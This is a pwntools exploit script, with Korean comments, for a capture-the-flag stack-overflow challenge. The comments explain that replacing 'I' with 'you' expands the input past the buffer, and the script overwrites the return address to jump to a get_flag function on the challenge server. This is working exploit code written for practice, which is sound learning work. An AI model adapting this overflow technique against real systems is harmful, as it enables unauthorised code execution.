#! -*- coding:utf-8 -*-
from pwn import * 

#p = process("./gpwn")
p = remote("ctf.j0n9hyun.xyz",3011)
flag = 0x08048f0d 
# 일단 get_flag라는 함수가 있다. 0x08048f0d 
# C++ 로 컴파일된 바이너리. 시작하면 fgets로 한번 0x20 바이트만큼 표준입력을 받고, 
# 입력 받은부분을 그대로 출력해준다.
# 그 다음 allocator 라는걸 쓰는데.. C++의 할당자 라는 개념으로 나온다. 
# 컨테이너들의 메모리를 관리하는 역할. 컨테이너는 일종의 자료구조.
# string 함수를 지나면 입력한 내용이 힙상에 올라가는게 보인다. 
# 이후 allocator 실행. 특정 스택 메모리 공간을 연결해주고 있다. 
# 일련의 과정이 끝나면, 스택위에 힙의 주소를 올린 다음 strcpy를 한다. 왜???
# 보니까 힙에 복사되는 위치에서 32,64바이트 떨어진 위치에 you , I 라는 문자열이 있는게 보이긴 한다.
# 그리고 24바이트 떨어진 위치에는 어떤 주소값도 들어있다.
# 중간에 replace 함수를 뺴먹었는데, libc_csu_init+82 와 입력문자, I, you 를 인자로 가져온다. 
# 입력값중에 I를 you로 치환하는데, 그만큼 바이트가 초과되서 뒤로 밀린다! 
# 이걸로 스택을 고장낼 수 있겠다. 문자열이 복사되는 위치와 eip 위치를 비교하자.
# 복사위치 0xffffd4cc ret 위치 0xffffd50c 총 64바이트. 
# I를 21개 넣어주면 63까지 덮일테니, "a" + I*21 + 리턴주소 식으로 넣어서 ret가 덮이는지 보자.
# 잘 덮인다. 공격 진행.

payload = "a"+"I"*21
payload += p32(0x08048f0d)

p.sendline(payload)

p.interactive()


